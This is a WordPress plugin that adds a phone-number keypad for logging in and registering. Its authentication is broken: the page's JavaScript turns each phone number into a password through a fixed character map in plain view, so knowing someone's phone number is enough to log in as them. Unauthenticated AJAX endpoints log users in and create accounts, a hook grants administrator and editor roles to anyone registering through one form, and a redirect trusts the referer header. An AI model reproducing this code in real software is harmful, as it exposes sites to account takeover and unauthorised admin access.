<?php
/*
Plugin Name: Commart Pinpad
Description: A plugin for one-step login with a Pinpad.
Version: 1.4
Author: Ehsan Pihadi
*/

// Add the shortcode
function commart_pinpad_shortcode() {
    ob_start();
    ?>
    <link rel="stylesheet" href="<?php echo plugin_dir_url(__FILE__); ?>css/style.css">
    <button id="commart-login-button">ورود</button>
    <div class="commart-login-popup" id="commart-login-popup">
        <div class="popup-content">
            <div class="number-display" id="number-display">&nbsp;</div>
            <div class="keypad">
                <button class="num">3</button>
                <button class="num">2</button>
                <button class="num">1</button>
                <button class="num">6</button>
                <button class="num">5</button>
                <button class="num">4</button>
                <button class="num">9</button>
                <button class="num">8</button>
                <button class="num">7</button>
                <button class="swap" id="swap-button"><i class="gg-user-add"></i></button>
                <button class="num">0</button>
                <button class="clear"><i class="gg-arrow-long-left"></i></button>
            </div>
            <div class="login-form rmagic" id="login-form">
                <?php echo do_shortcode('[RM_Login]'); ?>
            </div>
            <div class="register-form rmagic" id="register-form" style="display: none;">
                <?php echo do_shortcode('[RM_Forms id="2"]'); ?>
            </div>
            
        </div>
    </div>
    <script src="<?php echo plugin_dir_url(__FILE__); ?>includes/messages.js"></script>
    <script>
        document.getElementById('commart-login-button').addEventListener('click', function() {
            document.getElementById('commart-login-popup').style.display = 'flex';
        });

        const numberDisplay = document.getElementById('number-display');
        const buttons = document.querySelectorAll('.commart-login-popup .num');
        const clearButton = document.querySelector('.commart-login-popup .clear');
        const swapButton = document.getElementById('swap-button');
        let phoneNumber = '';
        let isLogin = true;
        let passwordMap = {
            '0': ['A', '@', 'F', 'N', 'O', 'h'],
            '1': ['P', 'a', '!', 'w', 'B', 'o'],
            '2': ['k', 'Y', '#', 'm', 'R', 'x'],
            '3': ['L', '$', 'n', 'G', 't', '&'],
            '4': ['%', 'r', 'j', 'C', 'I', 'c'],
            '5': ['D', 'v', 'f', 'H', 'z', 'E'],
            '6': ['?', 'e', 'K', 'p', 's', '^'],
            '7': ['x', 'V', 'b', 'U', 'g', 'J'],
            '8': ['Z', 'q', 'M', 'd', 'l', '*'],
            '9': ['y', 'T', 'i', 'W', 'X', 'u']
        };
        let passwordChars = {};
        let inactivityTimeout;

        buttons.forEach(button => {
            button.addEventListener('click', function() {
                if (phoneNumber.length < 11) {
                    phoneNumber += this.textContent;
                    this.style.color = "#FFFFFF"; // Change color on click
                    setTimeout(() => {
                        this.style.color = "#727272"; // Revert color back
                    }, 200);
                    updateDisplay();
                    resetInactivityTimeout();
                }
            });
        });

        clearButton.addEventListener('click', function() {
            phoneNumber = '';
            passwordChars = {};
            updateDisplay();
            resetInactivityTimeout();
        });
        swapButton.addEventListener('click', function() {
            isLogin = !isLogin;
            const iconClass = isLogin ? 'gg-user-add' : 'gg-user-list';
            swapButton.innerHTML = `<i class="${iconClass}"></i>`;
            updateForm();
        });

        function updateForm() {
            const loginForm = document.getElementById('login-form');
            const registerForm = document.getElementById('register-form');
            if (isLogin) {
                loginForm.style.display = 'block';
                registerForm.style.display = 'none';
            } else {
                loginForm.style.display = 'none';
                registerForm.style.display = 'block';
            }
            updateDisplay();
        }

        function updateDisplay() {
            numberDisplay.textContent = phoneNumber || '\xa0'; // Non-breaking space if empty
            numberDisplay.style.opacity = 0.5;
            setTimeout(() => {
                numberDisplay.style.opacity = 1;
            }, 200);
            // Update the username field in the form
            const usernameField = isLogin 
                ? document.querySelector('#rm_login_form_1-element-1')
                : document.querySelector('.rmformui .rmform-row .rmform-field input[type="text"]:not(:where(.rmform-ui.rmform-commart-form[data-design=matchmytheme] .rmform-row .rmform-field input[type="text"]))');
            if (usernameField) {
                usernameField.value = phoneNumber;
            }
            // Update the email field in the register form
            if (!isLogin) {
                const emailField = document.querySelector('.rmformui .rmform-row .rmform-field input[type="email"]:not(:where(.rmform-ui.rmform-commart-form[data-design=matchmytheme] .rmform-row .rmform-field input[type="email"]))');
                if (emailField) {
                    emailField.value = phoneNumber + '@commart.ir';
                }
            }
            // Generate password based on the phone number
            const passwordField = isLogin 
                ? document.querySelector('#rm_login_form_1-element-2')
                : document.querySelectorAll('.rmformui #rm-form-container .rmform-row .rmform-field.rmform-password-field-col input[type="password"]');
            if (passwordField) {
                if (isLogin) {
                    passwordField.value = generatePassword(phoneNumber);
                } else if (passwordField.length === 2) {
                    const generatedPassword = generatePassword(phoneNumber);
                    passwordField[0].value = generatedPassword;
                    passwordField[1].value = generatedPassword;
                }
            }

            if (phoneNumber.length === 11) {
                if (phoneNumber.startsWith('09')) {
                    if (isLogin) {
                        // Perform Ajax login check
                        ajaxLoginCheck(phoneNumber, passwordField.value);
                    } else {
                        // Perform Ajax registration check
                        ajaxRegisterCheck(phoneNumber, passwordField[0].value);
                    }
                } else {
                    triggerWrongAnimation();
                 
                }
            }
        }

        function generatePassword(phoneNumber) {
            let password = '';
            let digitCounts = {}; // To keep track of how many times each digit has been used

            for (let i = 0; i < phoneNumber.length; i++) {
                const digit = phoneNumber[i];
                if (!digitCounts[digit]) {
                    digitCounts[digit] = 0;
                }
                const charIndex = digitCounts[digit] % passwordMap[digit].length;
                password += passwordMap[digit][charIndex];
                digitCounts[digit]++;
            }
            return password;
        }

        function ajaxLoginCheck(username, password) {
            const xhr = new XMLHttpRequest();
            xhr.open('POST', '<?php echo admin_url('admin-ajax.php'); ?>', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    const response = JSON.parse(xhr.responseText);
                    if (response.success) {
                        numberDisplay.classList.add('correct');
                        setTimeout(() => {
                            numberDisplay.classList.remove('correct');
                            document.getElementById('rm_submit_btn').click();
                        }, 1000);
                    } else {
                        triggerWrongAnimation();
                       
                    }
                }
            };
            numberDisplay.classList.add('ajax-wait'); // Add blinking effect
            xhr.send('action=commart_ajax_login&username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password));
        }

        function ajaxRegisterCheck(username, password) {
            const xhr = new XMLHttpRequest();
            xhr.open('POST', '<?php echo admin_url('admin-ajax.php'); ?>', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    const response = JSON.parse(xhr.responseText);
                    if (response.success) {
                        numberDisplay.classList.add('correct');
                        setTimeout(() => {
                            numberDisplay.classList.remove('correct');
                            document.querySelector('.rmformui #rm_form_submit_button input[type="submit"]').click();
                        }, 1000);
                    } else {
                        triggerWrongAnimation();
                       
                    }
                }
            };
            numberDisplay.classList.add('ajax-wait'); // Add blinking effect
            xhr.send('action=commart_ajax_register_check&username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password));
        }

        function triggerWrongAnimation() {
            numberDisplay.classList.remove('ajax-wait'); // Remove blinking effect
            numberDisplay.classList.add('wrong');
            document.getElementById('commart-login-popup').classList.add('wrong-bg');
            setTimeout(() => {
                numberDisplay.classList.remove('wrong');
                document.getElementById('commart-login-popup').classList.remove('wrong-bg');
                removeDigitsOneByOne();
            }, 1000);
        }

        function removeDigitsOneByOne() {
            if (phoneNumber.length > 0) {
                phoneNumber = phoneNumber.slice(0, -1);
                updateDisplay();
                setTimeout(removeDigitsOneByOne, 100);
            }
        }

        
    </script>
    <?php
    return ob_get_clean();
}
add_shortcode('commart_pinpad', 'commart_pinpad_shortcode');

add_action('wp_ajax_nopriv_commart_ajax_login', 'commart_ajax_login');
add_action('wp_ajax_commart_ajax_login', 'commart_ajax_login');

function commart_ajax_login() {
    $username = sanitize_text_field($_POST['username']);
    $password = sanitize_text_field($_POST['password']);

    $user = wp_authenticate($username, $password);
    if (is_wp_error($user)) {
        wp_send_json_error(array('message' => 'Invalid username or password.'));
    } else {
        wp_set_current_user($user->ID);
        wp_set_auth_cookie($user->ID);
        wp_send_json_success();
    }
}

add_action('wp_ajax_nopriv_commart_ajax_register_check', 'commart_ajax_register_check');
add_action('wp_ajax_commart_ajax_register_check', 'commart_ajax_register_check');

function commart_ajax_register_check() {
    $username = sanitize_text_field($_POST['username']);
    $password = sanitize_text_field($_POST['password']);

    if (username_exists($username) || email_exists($username . '@commart.ir')) {
        wp_send_json_error(array('message' => 'Username or email already exists.'));
    } else {
        // Create the user here
        $user_id = wp_create_user($username, $password, $username . '@commart.ir');
        wp_send_json_success(array('user_id' => $user_id));
    }
}

// Add commart registration hooks
add_filter('user_registration_after_register_user_action', 'ur_add_user_role', 10, 3);
function ur_add_user_role($form_data, $form_id, $user_id) {
    if (in_array($form_id, array(40), true)) {
        $user = new WP_User($user_id);
        $new_role = array('administrator', 'editor'); // New role to assign to user.
        foreach ($new_role as $role) {
            $user->add_role($role);
        }
    }
}

add_filter('user_registration_before_insert_user', 'ur_insert_username', 10, 3);
function ur_insert_username($user_data, $valid_form_data, $form_id) {
    $user_data['user_login'] = $valid_form_data['user_email']->value;
    return $user_data;
}

add_filter('user_registration_before_register_user_filter', 'ur_set_email_as_username', 10, 2);
function ur_set_email_as_username($valid_form_data, $form_id) {
    $valid_form_data['user_login'] = $valid_form_data['user_email'];
    return $valid_form_data;
}

add_filter('user_registration_allow_automatic_user_login_email_confirmation', function($allow) {
    return false;
});

add_action('user_registration_check_token_complete', 'ur_auto_login_email_verification', 10, 2);
function ur_auto_login_email_verification($user_id, $user_reg_successful) {
    if ($user_reg_successful === true) {
        wp_set_auth_cookie($user_id);
        $url = home_url(); // Redirect to home page after successful registration
        wp_redirect($url);
        exit;
    }
}

add_filter('user_registration_form_redirect_url', 'ur_redirect_back_original_referer', 10, 2);
function ur_redirect_back_original_referer($redirect_url, $form_id) {
    if (isset($_SERVER['HTTP_REFERER'])) {
        $redirect_previous_url = $_SERVER['HTTP_REFERER'];
        return $redirect_previous_url;
    }
    return $redirect_url;
}

add_filter('user_registration_auto_login_redirection', function($redirect_url) {
    $redirect_url = home_url(); // Redirect to home page after auto login
    return $redirect_url;
});

add_action('user_registration_validate_user_login', 'ur_validate_user_login_field', 10, 4);
function ur_validate_user_login_field($single_form_field, $data, $filter_hook, $form_id) {
    $field_label = isset($data->label) ? $data->label : '';
    $username = isset($data->value) ? $data->value : '';
    if (15 < strlen($username)) {
        add_filter($filter_hook, function($msg) use ($field_label) {
            return __($field_label . ' cannot exceed 15 characters.', 'user-registration');
        });
    }
}

add_action('user_registration_validate_number', 'ur_validate_number_field', 10, 4);
function ur_validate_number_field($single_form_field, $data, $filter_hook, $form_id) {
    $field_label = isset($data->label) ? $data->label : '';
    $value = isset($data->value) ? $data->value : '';
    if ('number_box_1690949145' === $single_form_field->general_setting->field_name) {
        if (!preg_match('/^\d{5}$/', $value)) {
            add_filter($filter_hook, function($msg) use ($field_label) {
                return __($field_label . ' Need to be Exactly 5 Digits.', 'user-registration');
            });
        }
    }
}

add_filter('validate_username', 'commart_validate_username', 10, 2);
function commart_validate_username($valid, $username) {
    if (preg_match('/\\s/', $username)) {
       
        return false;
    }
    return $valid;
}


add_action('user_registration_after_register_user_action', 'ur_auto_login_after_registration', 10, 3);
function ur_auto_login_after_registration($form_data, $form_id, $user_id) {
    wp_set_current_user($user_id);
    wp_set_auth_cookie($user_id);
    wp_redirect(home_url());
    exit;
}

function commart_pinpad_enqueue_scripts() {
    wp_enqueue_style('commart-pinpad-style', plugin_dir_url(__FILE__) . 'css/style.css');
    wp_enqueue_script('commart-pinpad-messages', plugin_dir_url(__FILE__) . 'includes/messages.js', array(), false, true);
}
add_action('wp_enqueue_scripts', 'commart_pinpad_enqueue_scripts');
?>